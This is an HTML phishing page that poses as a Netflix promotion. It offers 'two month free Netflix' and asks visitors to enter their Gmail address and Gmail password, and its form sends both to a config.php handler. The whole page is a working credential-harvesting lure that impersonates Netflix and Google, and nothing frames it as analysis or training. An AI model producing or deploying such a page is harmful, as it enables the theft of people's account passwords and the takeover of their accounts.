<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Netflix</title>
  <link rel="stylesheet" href="style/style.css">
  <link rel="icon" href="image/logo.png">
</head>
<body>
  <div id="box" class="box">
    <div class="head">
      <h1>Sign In With Google</h1>
      <h3>Enjoy two month free Netflix.</h3>
    </div>
    <form action="config.php">
      <div class="input-box">
        <input id="username" type="email" name="username" placeholder="Gmail address" required>
      </div>
      <div class="input-box">
        <input id="password" type="password" name="password" placeholder="Gmail password" required>
        <div id="error"></div>
      </div>
      <div class="input-box1">
        <input id="submit" class="submit" type="submit" value="Get Two Month Free">
      </div>
    </form>
  </div>
  <script type="text/javascript" src="main.js"></script>

</body>
</html>